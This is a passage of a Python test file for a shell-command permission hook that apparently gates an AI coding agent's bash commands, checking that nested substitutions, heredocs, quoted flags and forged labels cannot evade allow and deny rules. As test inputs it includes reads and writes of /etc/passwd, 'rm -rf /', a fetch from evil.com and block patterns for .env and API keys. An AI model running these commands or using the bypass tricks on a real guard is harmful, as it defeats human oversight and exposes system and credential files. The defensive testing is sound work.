    def test_subshell_deeply_nested_in_quotes_blocked(self) -> None:
        """3-deep nested substitutions inside quotes are also checked."""
        result = evaluate_bash_command(
            'echo "$(a $(b $(cat /etc/passwd)))"',
            make_config(blocked=["^/etc/passwd$"]),
        )
        assert result["status"] == "deny"

    def test_subshell_process_substitution_blocked(self) -> None:
        """Process substitution <(...) also checked against blocked paths.

        The previous literal `<( /etc/passwd )` form relied on the path appearing
        verbatim in the AST; the new form `<(cat /etc/passwd)` tests the same
        traversal with realistic bash (a command whose argument is the blocked path).
        """
        result = evaluate_bash_command(
            "cat <(cat /etc/passwd)",
            make_config(blocked=["^/etc/passwd$"]),
        )
        assert result["status"] == "deny"

    def test_subshell_deeply_nested_unquoted_blocked(self) -> None:
        """Deep nesting outside quotes also catches blocked paths."""
        result = evaluate_bash_command(
            "echo $(a $(b $(cat /etc/passwd)))",
            make_config(blocked=["^/etc/passwd$"]),
        )
        assert result["status"] == "deny"

    def test_subshell_policy_allow_does_not_blanket_approve(self) -> None:
        """command_substitution=allow permits the subshell construct, not unapproved commands."""
        result = evaluate_bash_command(
            "ls $(ls)",
            make_config(command_substitution="allow"),
        )
        assert result["status"] == "ask"

    def test_subshell_policy_allow_with_approved_commands(self) -> None:
        """command_substitution=allow approves the substitution when the commands are approved."""
        result = evaluate_bash_command(
            "ls $(ls)",
            make_config(command_substitution="allow", wildcard="allow"),
        )
        assert result["status"] == "allow"

    def test_subshell_matched_pattern_listed_once(self) -> None:
        """A command matched by both the segment loop and the AST walk counts once.
        `echo $(ls -l)` yields one segment for `echo` and one for `ls`, and the
        same `ls` call is not visited again by the AST traversal, so `^ls` is
        listed once.
        """
        result = evaluate_bash_command(
            "echo $(ls -l)",
            make_config(allowed=[r"^echo(\s+.*)?$", r"^ls(\s+.*)?$"], command_substitution="allow"),
        )
        assert result["status"] == "allow"
        assert result["reason"].count(r"^echo(\s+.*)?$") == 1
        assert result["reason"].count(r"^ls(\s+.*)?$") == 1

    def test_subshell_matched_pattern_counted_per_occurrence(self) -> None:
        """Two distinct `ls` commands list `^ls` twice (no de-duplication)."""
        result = evaluate_bash_command(
            "ls --color $(ls -a)",
            make_config(allowed=[r"^ls(\s+.*)?$"], command_substitution="allow"),
        )
        assert result["status"] == "allow"
        assert result["reason"].count(r"^ls(\s+.*)?$") == 2

    def test_subshell_matched_pattern_kept_for_assignment_value(self) -> None:
        """Commands inside assignment values keep their matched pattern in the label."""
        result = evaluate_bash_command(
            "echo $(ls); x=$(cat /tmp/ed)",
            make_config(
                allowed=[r"^echo(\s+.*)?$", r"^ls(\s+.*)?$", r"^cat(\s+.*)?$"],
                command_substitution="allow",
                variable_assignment="allow",
            ),
        )
        assert result["status"] == "allow"
        assert result["reason"].count(r"^echo(\s+.*)?$") == 1
        assert result["reason"].count(r"^ls(\s+.*)?$") == 1
        assert result["reason"].count(r"^cat(\s+.*)?$") == 1

    def test_export_matched_pattern_listed_once(self) -> None:
        """`export FOO` matches the export pattern and lists it once.

        The operand is a separate variable-assignment segment (allowed here), so
        the count reflects the keyword segment alone - no double listing from
        the segment loop and the AST walk.
        """
        result = evaluate_bash_command(
            "export FOO",
            make_config(allowed=[r"^export(\s+.*)?$"], variable_assignment="allow"),
        )
        assert result["status"] == "allow"
        assert result["reason"].count(r"^export(\s+.*)?$") == 1

    def test_declclause_substitution_value_inherits_wildcard_allow(self) -> None:
        """Nested substitution in a decl variant value inherits wildcard allow."""
        result = evaluate_bash_command(
            "declare FOO=$(cat x)",
            make_config(wildcard="allow"),
        )
        assert result["status"] == "allow"

    def test_declclause_substitution_value_not_silently_allowed(self) -> None:
        """Nested substitution in a decl variant value asks when command_substitution=ask."""
        config = make_config(wildcard="allow")
        config["command_substitution"] = "ask"
        result = evaluate_bash_command("declare FOO=$(cat x)", config)
        assert result["status"] == "ask"

    def test_declclause_substitution_blocked_path_denied(self) -> None:
        """Blocked path inside a decl variant value denies even with wildcard allow."""
        result = evaluate_bash_command(
            "local PATH=$(cat /etc/passwd)",
            make_config(blocked=[r"^/etc/passwd$"], wildcard="allow", command_substitution="allow"),
        )
        assert result["status"] == "deny"

    def test_subshell_policy_deny(self) -> None:
        """command_substitution=deny forces denial regardless of wildcard."""
        result = evaluate_bash_command(
            "ls $(ls)",
            make_config(wildcard="allow", command_substitution="deny"),
        )
        assert result["status"] == "deny"

    def test_subshell_blocked_path_overrides_allow(self) -> None:
        """Blocked paths inside $(...) still deny even with allow policy."""
        result = evaluate_bash_command(
            'echo "$(cat /etc/passwd)"',
            make_config(command_substitution="allow", blocked=["^/etc/passwd$"]),
        )
        assert result["status"] == "deny"


class TestEvaluateParamExpansionSubstitutions:
    """Substitutions inside parameter expansions are enforced.

    `${var/pat/$(cmd)}` (and `${var:-$(cmd)}`, `${var%$(cmd)}`,
    `${var:offset:$(cmd)}`) must be visible to the subshell, allowed-pattern,
    and blocked-path passes, so the inner command is not auto-approved by the
    outer command's allow pattern.
    """

    def test_repl_replacement_subshell_denied(self) -> None:
        """Substitution in replacement part abides by command_substitution=deny."""
        result = evaluate_bash_command(
            "echo ${x//a/$(rm -rf x)}",
            make_config(allowed=[r"^echo(\s+.*)?$"], command_substitution="deny"),
        )
        assert result["status"] == "deny"

    def test_repl_pattern_subshell_denied(self) -> None:
        """Substitution in the pattern part abides by command_substitution=deny."""
        result = evaluate_bash_command(
            "echo ${x//$(recon_cmd)/y}",
            make_config(allowed=[r"^echo(\s+.*)?$"], command_substitution="deny"),
        )
        assert result["status"] == "deny"

    def test_repl_replacement_blocked_path_denied(self) -> None:
        """Blocked path read via the replacement part is denied."""
        result = evaluate_bash_command(
            "echo ${x//a/$(cat /etc/passwd)}",
            make_config(blocked=["^/etc/passwd$"], wildcard="ask"),
        )
        assert result["status"] == "deny"

    def test_repl_replacement_inner_command_not_allow_listed(self) -> None:
        """Inner command can't ride the outer echo allow pattern."""
        result = evaluate_bash_command(
            "echo ${x//a/$(rm -rf x)}",
            make_config(allowed=[r"^echo(\s+.*)?$"]),
        )
        assert result["status"] == "ask"

    def test_exp_default_subshell_denied(self) -> None:
        """Substitution in ${var:-...} abides by command_substitution=deny."""
        result = evaluate_bash_command(
            'echo "${y:-$(rm -rf x)}"',
            make_config(allowed=[r"^echo(\s+.*)?$"], command_substitution="deny"),
        )
        assert result["status"] == "deny"

    def test_exp_trim_subshell_denied(self) -> None:
        """Substitution in ${var%...} abides by command_substitution=deny."""
        result = evaluate_bash_command(
            'echo "${z%$(rm -rf x)}"',
            make_config(allowed=[r"^echo(\s+.*)?$"], command_substitution="deny"),
        )
        assert result["status"] == "deny"

    def test_exp_default_blocked_path_denied(self) -> None:
        """Blocked path in ${var:-...} is denied."""
        result = evaluate_bash_command(
            'echo "${w:-$(cat /etc/passwd)}"',
            make_config(blocked=["^/etc/passwd$"], wildcard="ask"),
        )
        assert result["status"] == "deny"

    def test_slice_subshell_denied(self) -> None:
        """Substitution in ${var:offset} abides by command_substitution=deny."""
        result = evaluate_bash_command(
            "echo ${x:0:$(rm -rf x)}",
            make_config(allowed=[r"^echo(\s+.*)?$"], command_substitution="deny"),
        )
        assert result["status"] == "deny"


class TestEvaluateOpaqueSubstitutionPatternGuard:
    """Opaque `$(...)` args must not slip past restrictive allow patterns.
    `find . $(echo -delete)` must not be approved by matching the outer
    command as `find . $(...)` - the negative lookahead would never see
    `-delete` - while the inner `echo -delete` is individually approved:
    the command line that actually runs is `find . -delete`.
    """

    def test_lookahead_pattern_bypass_not_allowed(self) -> None:
        cfg = make_config(allowed=[r"^find(?!.*\s-(exec|delete|ok)(\s|;|$)).*$"], command_substitution="allow")
        assert evaluate_bash_command("find . -delete", cfg)["status"] == "ask"
        assert evaluate_bash_command("find . $(echo -delete)", cfg)["status"] == "ask"
        assert evaluate_bash_command(r"find . $(echo -exec rm {} \;)", cfg)["status"] == "ask"

    def test_git_output_guard_bypass_not_allowed(self) -> None:
        cfg = make_config(
            allowed=[r"^git\s+(?!.*--output\b)(-C\s+[\w./\\\\-]+\s+)?(log|diff|show)(\s+.*)?$"],
            command_substitution="allow",
        )
        assert evaluate_bash_command("git diff --output=/tmp/x", cfg)["status"] == "ask"
        assert evaluate_bash_command("git diff $(echo --output=/tmp/x)", cfg)["status"] == "ask"
        # Legit git invocations without a substitution still auto-approve.
        assert evaluate_bash_command("git diff --cached", cfg)["status"] == "allow"
        assert evaluate_bash_command("git status", cfg)["status"] == "ask"

    def test_bare_name_anchor_not_bypassed(self) -> None:
        cfg = make_config(allowed=["^true$"], command_substitution="allow")
        assert evaluate_bash_command("true", cfg)["status"] == "allow"
        assert evaluate_bash_command("true --flag", cfg)["status"] == "ask"
        assert evaluate_bash_command("true $(echo --flag)", cfg)["status"] == "ask"

    def test_free_tail_pattern_still_allows_substitution(self) -> None:
        """Patterns that accept arbitrary arguments are unaffected."""
        cfg = make_config(allowed=[r"^echo(\s+.*)?$", r"^ls(\s+.*)?$"], command_substitution="allow")
        assert evaluate_bash_command("echo $(echo hi)", cfg)["status"] == "allow"
        assert evaluate_bash_command("echo $(echo $(echo hi))", cfg)["status"] == "allow"
        assert evaluate_bash_command("ls $(echo -la)", cfg)["status"] == "allow"


class TestEvaluateEdgeCases:
    """Tests for edge cases."""

    def test_empty_command(self) -> None:
        """Empty command cannot be parsed → raises, routed via error policy."""
        with pytest.raises(ShfmtError):
            evaluate_bash_command("", make_config())

    def test_whitespace_only(self) -> None:
        """Whitespace-only command cannot be parsed → raises."""
        with pytest.raises(ShfmtError):
            evaluate_bash_command("   ", make_config())

    def test_single_command(self) -> None:
        """Single command."""
        result = evaluate_bash_command("ls", make_config(allowed=["^ls"]))
        assert result["status"] == "allow"

    def test_multiple_arguments(self) -> None:
        """Multiple arguments (full command match)."""
        result = evaluate_bash_command(
            "ls -la /etc",
            make_config(allowed=["^ls\\s+-la\\s+/etc"]),
        )
        assert result["status"] == "allow"

    def test_quoted_arguments(self) -> None:
        """Quoted arguments match after quote stripping (full command match)."""
        result = evaluate_bash_command(
            "echo 'hello world'",
            make_config(allowed=["^echo\\s+hello\\s+world$"]),
        )
        assert result["status"] == "allow"

    def test_single_quoted_flag_bypasses_negative_lookahead(self) -> None:
        """find '-exec' must NOT bypass the ^find(...-(exec|delete|ok)...) pattern."""
        result = evaluate_bash_command(
            "find . '-exec' rm {} +",
            make_config(allowed=["^find(?!.*\\s-(exec|delete|ok)(\\s|;|$)).*$"]),
        )
        # The negative lookahead should block this (it would be unquoted -exec)
        assert result["status"] != "allow"

    def test_double_quoted_flag_bypasses_negative_lookahead(self) -> None:
        """sort "-o" must NOT bypass the ^sort(?!\\s+(-o|--output)\\b).*$ pattern."""
        result = evaluate_bash_command(
            'sort "-o" /tmp/out /tmp/in',
            make_config(allowed=["^sort(?!\\s+(-o|--output)\\b).*$"]),
        )
        assert result["status"] != "allow"

    def test_single_quoted_fd_flag_bypasses_negative_lookahead(self) -> None:
        """fd '-X' must NOT bypass the ^fd(?!.*\\s+(-x|-X)).*$ pattern."""
        result = evaluate_bash_command(
            "fd '-X' rm {}",
            make_config(allowed=["^fd(?!.*\\s+(-x|-X)).*$"]),
        )
        assert result["status"] != "allow"

    def test_unquoted_blocked_flags_still_caught(self) -> None:
        """Unquoted blocked flags must still be caught by negative lookaheads."""
        result = evaluate_bash_command(
            "find . -exec rm {} +",
            make_config(allowed=["^find(?!.*\\s-(exec|delete|ok)(\\s|;|$)).*$"]),
        )
        assert result["status"] != "allow"

    def test_single_quoted_safe_command_still_allowed(self) -> None:
        """Single-quoted arguments that don't match negative lookaheads should be allowed."""
        result = evaluate_bash_command(
            "find . -name '*.txt'",
            make_config(allowed=["^find(?!.*\\s-(exec|delete|ok)(\\s|;|$)).*$"]),
        )
        assert result["status"] == "allow"

    def test_variables(self) -> None:
        """Shell variables (full command match)."""
        result = evaluate_bash_command(
            "ls $HOME",
            make_config(allowed=["^ls\\s+\\$HOME"]),
        )
        assert result["status"] == "allow"

    def test_complex_pipeline(self) -> None:
        """Complex pipeline with multiple rules (full command match)."""
        result = evaluate_bash_command(
            "ls | grep foo | head",
            make_config(allowed=["^ls", "^grep\\s+foo", "^head"]),
        )
        assert result["status"] == "allow"


class TestEvaluateHookLabelRecognition:
    """The hook's `:` label is gated like any other command, not exempted.

    The hook rewrites commands as ``: '<label>' <emoji> ; <cmd>`` and Devin
    feeds that string back.  The ``:`` is an ordinary command, checked by both
    the allowed-pattern and blocked-pattern checks, and permitted by the same
    ``Exec(:)`` entry ``--setup``
    writes into the user's Devin config (see ``TestLabelExecEntry``). The
    payload after ``;`` is still fully vetted.
    """

    #: What ``Exec(:)`` in a Devin config resolves to.
    EXEC_COLON = exec_permission_to_regex(":")

    def _config(
        self,
        blocked: list[str] | None = None,
        wildcard: str = "ask",
    ) -> dict[str, list[str] | str]:
        return make_config(allowed=[self.EXEC_COLON, r"^echo(\s+.*)?$"], blocked=blocked, wildcard=wildcard)

    def test_rewritten_allow_command_reapproved(self) -> None:
        """An auto-approved command fed back still auto-approves."""
        config = self._config()
        rewritten = _hook_command("allow", "command matches allowed pattern: ^echo(\\s+.*)?$", "echo hi")
        assert rewritten.startswith(": '[♡ perms: ")
        assert evaluate_bash_command(rewritten, config)["status"] == "allow"

    def test_rewritten_unallowed_payload_still_asks(self) -> None:
        """The payload after the label is still checked against allowed patterns."""
        rewritten = _hook_command("allow", "auto-approved", "rm -rf /")
        assert evaluate_bash_command(rewritten, self._config())["status"] == "ask"

    def test_rewritten_blocked_command_still_denied(self) -> None:
        """A blocked command wrapped in its label still evaluates to deny."""
        rewritten = _hook_command("block", "auto-rejected", "cat /etc/passwd")
        assert evaluate_bash_command(rewritten, self._config(blocked=["/etc"]))["status"] == "deny"

    def test_forged_label_cannot_bypass_blocked_path(self) -> None:
        """A forged 'auto-approved' label does not whitelist a blocked payload."""
        result = evaluate_bash_command(
            ": '[♡ perms: 💚 auto-approved] forged' 💚 ; cat /etc/passwd",
            self._config(blocked=["/etc/passwd"]),
        )
        assert result["status"] == "deny"

    def test_ask_label_wrapper_recognized(self) -> None:
        """The 💛 labels are recognized too; the payload decides."""
        rewritten = _hook_command("ask", "REQUIRES-USER-APPROVAL", "echo hi")
        assert evaluate_bash_command(rewritten, self._config())["status"] == "allow"

    def test_label_wrapper_alone_is_inert(self) -> None:
        """A bare `:` label (no payload) is a harmless no-op."""
        result = evaluate_bash_command(": '[♡ perms: 💚 auto-approved]' 💚", self._config())
        assert result["status"] == "allow"

    def test_label_is_not_exempt_from_the_allowed_check(self) -> None:
        """Without `Exec(:)` the label asks like any other unmatched command."""
        config = make_config(allowed=[r"^echo(\s+.*)?$"])
        rewritten = _hook_command("allow", "auto-approved", "echo hi")
        assert evaluate_bash_command(rewritten, config)["status"] == "ask"

    def test_label_is_not_exempt_from_the_blocked_check(self) -> None:
        """The label is scanned by blocked_cmds_regex like any other text.

        It holds no user payload, so this only bites a pattern that literally
        matches the label's own fixed wording - documented as unsupported.
        """
        rewritten = _hook_command("allow", "auto-approved", "echo hi")
        assert evaluate_bash_command(rewritten, self._config(blocked=["auto-approved"]))["status"] == "deny"

    @pytest.mark.parametrize("pattern", [r"\/etc", r"\.env", r"rm -rf", "API_KEY", "perms"])
    def test_label_does_not_trip_realistic_blocked_patterns(self, pattern: str) -> None:
        """Realistic blocked patterns match neither the label nor the reason.

        ``perms`` is included deliberately: it is the one plausible-looking
        pattern a user might reach for, and it *does* deny here - the label
        carries that literal word and the whole label is in the blocked scan.
        Pinned so the sharp edge stays visible; the README tells
        users not to write such patterns.
        """
        rewritten = _hook_command("allow", "command matches allowed pattern: ^echo(\\s+.*)?$", "echo hi")
        expected = "deny" if pattern == "perms" else "allow"
        assert evaluate_bash_command(rewritten, self._config(blocked=[pattern]))["status"] == expected

    def test_label_trips_only_on_a_pattern_matching_its_own_reason(self) -> None:
        """The one sharp edge: a pattern matching the echoed allow-list entry.

        ``\\^echo`` matches ``^echo`` inside the reason while missing the command
        itself, and the whole-command scan sees the label, so it denies. There
        is no config-side fix; it is inherent to not exempting the label.
        """
        rewritten = _hook_command("allow", "command matches allowed pattern: ^echo(\\s+.*)?$", "echo hi")
        result = evaluate_bash_command(rewritten, self._config(blocked=[r"\^echo"]))
        assert result["status"] == "deny"
        assert "auto-approved" in result["reason"]

    def test_user_written_colon_is_treated_identically(self) -> None:
        """No special case remains: a user's own `:` obeys the same rules."""
        config = self._config(blocked=["/etc"])
        for payload, expected in (("echo hi", "allow"), ("rm -rf /", "ask"), ("cat /etc/passwd", "deny")):
            user = f": 'anything at all' ; {payload}"
            label = _hook_command("allow", "anything at all", payload)
            assert evaluate_bash_command(user, config)["status"] == expected, payload
            assert evaluate_bash_command(label, config)["status"] == expected, payload


class TestEvaluatePerKindOutputRedirection:
    """Tests for per-kind output redirection policy resolution."""

    def test_stderr_to_dev_null_allow_with_ask_wildcard(self) -> None:
        """stderr_to_dev_null=allow approves only the redirect, not the command."""
        result = evaluate_bash_command(
            "echo hi 2> /dev/null",
            {
                "*": "ask",
                "output_redirection": {"*": "ask", "stderr_to_dev_null": "allow"},
            },
        )
        assert result["status"] == "ask"

    def test_stderr_to_stdout_allow_with_ask_wildcard(self) -> None:
        """2>&1 stderr_to_stdout=allow does not approve an unallow-listed command."""
        result = evaluate_bash_command(
            "echo hi 2>&1",
            {
                "*": "ask",
                "output_redirection": {"*": "ask", "stderr_to_stdout": "allow"},
            },
        )
        assert result["status"] == "ask"

    def test_combined_op_deny_overrides(self) -> None:
        """Combined op >& /dev/null: deny kind overrides ask."""
        result = evaluate_bash_command(
            "echo hi >& /dev/null",
            {
                "*": "ask",
                "output_redirection": {"*": "allow", "stdout_to_dev_null": "allow", "stderr_to_dev_null": "deny"},
            },
        )
        assert result["status"] == "deny"

    def test_stdout_to_dev_null_allow(self) -> None:
        """> /dev/null with stdout_to_dev_null=allow still asks an unapproved command."""
        result = evaluate_bash_command(
            "echo hi > /dev/null",
            {
                "*": "ask",
                "output_redirection": {"*": "ask", "stdout_to_dev_null": "allow"},
            },
        )
        assert result["status"] == "ask"

    def test_other_redir_falls_back_to_wildcard(self) -> None:
        """> /tmp/out.txt uses 'other' kind, falls back to wildcard."""
        result = evaluate_bash_command(
            "echo hi > /tmp/out.txt",
            {
                "*": "ask",
                "output_redirection": {"*": "ask", "stdout_to_dev_null": "allow"},
            },
        )
        assert result["status"] == "ask"

    def test_clobber_redirection_ask(self) -> None:
        """>| /tmp/out triggers output redirection ask (same as >)."""
        result = evaluate_bash_command(
            "echo hi >| /tmp/out.txt",
            {"*": "ask", "output_redirection": {"*": "ask"}},
        )
        assert result["status"] == "ask"

    def test_multiple_redirs_all_allow(self) -> None:
        """Wildcard ask, specific kinds allow -> any-asks returns ask."""
        result = evaluate_bash_command(
            "echo hi > /tmp/out.txt 2> /dev/null",
            {
                "*": "ask",
                "output_redirection": {"*": "ask", "stdout_to_dev_null": "allow", "stderr_to_dev_null": "allow"},
            },
        )
        assert result["status"] == "ask"

    def test_mixed_allow_deny_resolves_to_deny(self) -> None:
        """Deny kind overrides ask/wildcard."""
        result = evaluate_bash_command(
            "echo hi 2> /dev/null",
            {
                "*": "allow",
                "output_redirection": {"*": "allow", "stderr_to_dev_null": "deny"},
            },
        )
        assert result["status"] == "deny"

    def test_input_redirection_uses_wildcard(self) -> None:
        """Input redirection object policy allow does not approve the command."""
        result = evaluate_bash_command(
            "cat < /tmp/in.txt",
            {
                "*": "ask",
                "input_redirection": {"*": "allow"},
            },
        )
        assert result["status"] == "ask"


class TestEvaluateResultStructure:
    """Tests for result dictionary structure."""

    def test_result_has_status(self) -> None:
        """Result must have 'status' field."""
        result = evaluate_bash_command("ls", make_config())
        assert "status" in result
        assert result["status"] in ["allow", "ask", "deny"]

    def test_result_has_segments(self) -> None:
        """Result must have 'segments' array."""
        result = evaluate_bash_command("ls", make_config())
        assert "segments" in result
        assert isinstance(result["segments"], list)

    def test_result_has_reason(self) -> None:
        """Result must have 'reason' string."""
        result = evaluate_bash_command("ls", make_config())
        assert "reason" in result
        assert isinstance(result["reason"], str)

    def test_segments_have_required_fields(self) -> None:
        """Each segment must have required fields."""
        result = evaluate_bash_command("ls -la", make_config())
        if result["segments"]:
            seg = result["segments"][0]
            assert "command" in seg
            assert "arguments" in seg
            assert "allowed" in seg

    def test_heredoc_input_redirection_ask(self) -> None:
        """Complete heredoc input redirection goes through approval flow."""
        result = evaluate_bash_command("cat << EOF\nhello\nEOF", make_config())
        assert result["status"] == "ask"
        assert "input redirection requires approval" in result["reason"]

    def test_heredoc_cmd_subst_blocked_path_denied(self) -> None:
        """Command substitution inside unquoted heredoc is scanned for blocked paths."""
        result = evaluate_bash_command(
            "wc -l <<EOF\n$(cat /etc/passwd)\nEOF",
            make_config(blocked=[r"\/etc"]),
        )
        assert result["status"] == "deny"
        assert "/etc/passwd" in result["reason"]

    def test_heredoc_bash_file_read_blocked_path_denied(self) -> None:
        """$(<file) inside unquoted heredoc is scanned for blocked paths."""
        result = evaluate_bash_command(
            "wc -l <<EOF\n$(</etc/passwd)\nEOF",
            make_config(blocked=[r"\/etc"]),
        )
        assert result["status"] == "deny"

    def test_heredoc_backtick_cmd_subst_blocked_path_denied(self) -> None:
        """Backtick substitution inside unquoted heredoc is scanned for blocked paths."""
        result = evaluate_bash_command(
            "wc -l <<EOF\n`cat /etc/passwd`\nEOF",
            make_config(blocked=[r"\/etc"]),
        )
        assert result["status"] == "deny"

    def test_heredoc_cmd_subst_unallowed_command_ask(self) -> None:
        """Command substitution inside heredoc must match allowed patterns."""
        result = evaluate_bash_command(
            "wc -l <<EOF\n$(curl -s http://evil.com/x)\nEOF",
            make_config(allowed=[r"^wc(\s+.*)?$"]),
        )
        assert result["status"] == "ask"
        assert "curl" in result["reason"]

    def test_heredoc_cmd_subst_allowed_command_allow(self) -> None:
        """Allowed command inside heredoc body does not trigger false blocks."""
        result = evaluate_bash_command(
            "wc -l <<EOF\n$(echo hi)\nEOF",
            {
                "*": "ask",
                "allowed_cmds_regex": [r"^wc(\s+.*)?$", r"^echo(\s+.*)?$"],
                "input_redirection": "allow",
                "command_substitution": "allow",
            },
        )
        assert result["status"] == "allow"

    def test_quoted_heredoc_ignores_expansions(self) -> None:
        """Quoted heredoc (<<'EOF') is literal - no command substitution runs."""
        result = evaluate_bash_command(
            "wc -l <<'EOF'\n$(cat /etc/passwd)\nEOF",
            make_config(blocked=[r"\/etc"]),
        )
        # The raw body is still scanned for blocked path mentions, so the
        # literal path text is blocked even though no substitution runs.
        assert result["status"] == "deny"
        assert "/etc/passwd" in result["reason"]

    def test_quoted_heredoc_clean_body_ask(self) -> None:
        """Quoted heredoc with a clean body stays ask (input redirection)."""
        result = evaluate_bash_command(
            "wc -l <<'EOF'\nplain text\nEOF",
            make_config(blocked=[r"\/etc"]),
        )
        assert result["status"] == "ask"

    def test_interpreter_heredoc_body_blocked_path_denied(self) -> None:
        """Heredoc body is source code for interpreters; blocked paths in it are denied.

        Even when the interpreter is allow-listed, a body like
        ``open("/etc/passwd").read()`` opens a blocked file at runtime.
        """
        result = evaluate_bash_command(
            'python3 <<EOF\nopen("/etc/passwd").read()\nEOF',
            {
                "*": "ask",
                "allowed_cmds_regex": [r"^python3(\s+.*)?$"],
                "blocked_cmds_regex": [r"\/etc"],
                "input_redirection": "allow",
                "command_substitution": "allow",
            },
        )
        assert result["status"] == "deny"
        assert "/etc/passwd" in result["reason"]

    def test_interpreter_heredoc_body_clean_allow(self) -> None:
        """Allow-listed interpreter heredoc with a clean body is approved."""
        result = evaluate_bash_command(
            'python3 <<EOF\nprint("hi")\nEOF',
            {
                "*": "ask",
                "allowed_cmds_regex": [r"^python3(\s+.*)?$"],
                "blocked_cmds_regex": [r"\/etc"],
                "input_redirection": "allow",
                "command_substitution": "allow",
            },
        )
        assert result["status"] == "allow"

    def test_heredoc_body_line_env_path_denied(self) -> None:
        """End-anchored blocked pattern matches a path on its own body line."""
        result = evaluate_bash_command(
            "wc -l <<EOF\n/home/alx/.env\nEOF",
            {
                "*": "ask",
                "allowed_cmds_regex": [r"^wc(\s+.*)?$"],
                "blocked_cmds_regex": [r"\.env$"],
                "input_redirection": "allow",
                "command_substitution": "allow",
            },
        )
        assert result["status"] == "deny"

    def test_multiline_heredoc_body_blocked_line_denied(self) -> None:
        """Blocked path in the middle of a multi-line heredoc body is denied."""
        result = evaluate_bash_command(
            "wc -l <<EOF\nfirst line\n/etc/passwd\nlast line\nEOF",
            make_config(allowed=[r"^wc(\s+.*)?$"], blocked=[r"\/etc"]),
        )
        assert result["status"] == "deny"
        assert "/etc/passwd" in result["reason"]

    def test_multiline_heredoc_body_clean_allow(self) -> None:
        """Clean multi-line heredoc body does not trigger the blocked scan."""
        result = evaluate_bash_command(
            "wc -l <<EOF\nfirst line\nsecond line\nEOF",
            {
                "*": "ask",
                "allowed_cmds_regex": [r"^wc(\s+.*)?$"],
                "blocked_cmds_regex": [r"\/etc"],
                "input_redirection": "allow",
                "command_substitution": "allow",
            },
        )
        assert result["status"] == "allow"

    def test_here_string_input_redirection_ask(self) -> None:
        """Here-string (<<<) input redirection goes through approval flow."""
        result = evaluate_bash_command(
            "echo hello <<< 'world'",
            make_config(input_redir="ask"),
        )
        assert result["status"] == "ask"
        assert "input redirection requires approval" in result["reason"]

    def test_here_string_not_bypassed_by_allowed_pattern(self) -> None:
        """Here-string (<<<) still requires approval even with a matching allowed pattern."""
        result = evaluate_bash_command(
            "echo hello <<< 'world'",
            {
                "*": "ask",
                "input_redirection": "ask",
                "allowed_cmds_regex": [r"^echo(\s+.*)?$"],
            },
        )
        assert result["status"] == "ask"
        assert "input redirection requires approval" in result["reason"]

    def test_dup_input_redirection_ask(self) -> None:
        """Input fd duplication (cat <&2) goes through approval flow."""
        result = evaluate_bash_command(
            "cat <&2",
            {"*": "ask", "input_redirection": "ask"},
        )
        assert result["status"] == "ask"
        assert "input redirection requires approval" in result["reason"]

    def test_dup_input_redirection_allowed_when_policy_allow(self) -> None:
        """Input fd duplication allowed only for the redirect, not the command."""
        result = evaluate_bash_command(
            "cat <&2",
            {"*": "ask", "input_redirection": "allow"},
        )
        assert result["status"] == "ask"

    def test_dup_input_redirection_deny_when_policy_deny(self) -> None:
        """Input fd duplication denied when input_redirection=deny."""
        result = evaluate_bash_command(
            "cat <&2",
            {"*": "ask", "input_redirection": "deny"},
        )
        assert result["status"] == "deny"
        assert "input redirection denied from" in result["reason"]

    def test_incomplete_heredoc_raises(self) -> None:
        """Incomplete heredoc (unclosed) cannot be parsed → raises."""
        with pytest.raises(ShfmtError):
            evaluate_bash_command("cat << EOF", make_config())

    def test_input_redirect_to_blocked_path_denied(self) -> None:
        """Input redirect to blocked path is denied."""
        result = evaluate_bash_command(
            "cat < /etc/passwd",
            make_config(blocked=["^/etc/"]),
        )
        assert result["status"] == "deny"

    def test_input_redirect_allowed_when_policy_allow(self) -> None:
        """Input redirection=allow approves only the redirect, not the command."""
        result = evaluate_bash_command(
            "cat < /tmp/in.txt",
            {"*": "ask", "input_redirection": "allow"},
        )
        assert result["status"] == "ask"

    def test_input_redirect_ask_when_policy_ask(self) -> None:
        """Input redirection asks when input_redirection=ask."""
        result = evaluate_bash_command(
            "cat < /tmp/in.txt",
            {"*": "ask", "input_redirection": "ask"},
        )
        assert result["status"] == "ask"

    def test_input_redirect_deny_when_policy_deny(self) -> None:
        """Input redirection denied when input_redirection=deny."""
        result = evaluate_bash_command(
            "cat < /tmp/in.txt",
            {"*": "ask", "input_redirection": "deny"},
        )
        assert result["status"] == "deny"

    def test_output_redirect_to_blocked_path_denied(self) -> None:
        """Output redirection to a blocked path is denied."""
        result = evaluate_bash_command(
            "echo hi > /etc/passwd",
            make_config(blocked=["^/etc/"]),
        )
        assert result["status"] == "deny"
        assert "blocked pattern" in result["reason"]

    def test_output_redirect_append_to_blocked_path_denied(self) -> None:
        """Append output redirection to a blocked path is denied."""
        result = evaluate_bash_command(
            "echo hi >> /etc/shells",
            make_config(blocked=["/etc/shells"]),
        )
        assert result["status"] == "deny"

    def test_output_redirect_to_blocked_path_denied_even_when_policy_ask(self) -> None:
        """Blocked output targets deny regardless of the redirection policy."""
        result = evaluate_bash_command(
            "echo hi > /etc/passwd",
            make_config(blocked=["^/etc/"], output="ask"),
        )
        assert result["status"] == "deny"

    def test_output_redirect_to_unblocked_path_allowed(self) -> None:
        """Output redirection to a non-blocked path is not denied."""
        result = evaluate_bash_command(
            "echo hi > /tmp/out.txt",
            {"*": "allow", "output_redirection": "allow", "blocked_cmds_regex": ["^/etc/"]},
        )
        assert result["status"] == "allow"

    def test_output_redirect_no_target_not_blocked(self) -> None:
        """FD-clobbering redirects without a target path are not affected."""
        result = evaluate_bash_command(
            "echo hi 2>&1",
            {"*": "allow", "output_redirection": "allow", "blocked_cmds_regex": ["^/etc/"]},
        )
        assert result["status"] == "allow"

    def test_block_output_redirection_denied(self) -> None:
        """Block-level output redirection to a blocked path denies."""
        result = evaluate_bash_command(
            "{ echo hi; } > /etc/passwd",
            make_config(blocked=["^/etc/"]),
        )
        assert result["status"] == "deny"

    def test_subshell_output_redirection_denied(self) -> None:
        """Subshell output redirection to a blocked path denies."""
        result = evaluate_bash_command(
            "( echo hi ) > /etc/passwd",
            make_config(blocked=["^/etc/"]),
        )
        assert result["status"] == "deny"

    def test_pipe_output_redirection_to_blocked_path_denied(self) -> None:
        """Pipe with a trailing output redirection to a blocked path denies."""
        result = evaluate_bash_command(
            "echo hi | cat > /etc/passwd",
            make_config(blocked=["^/etc/"]),
        )
        assert result["status"] == "deny"

    def test_empty_segments_with_allowed_patterns_asks(self) -> None:
        """Unmatched export command with allowed patterns → ask."""
        result = evaluate_bash_command("export BOGUS=true bogus", make_config(allowed=["^ls"]))
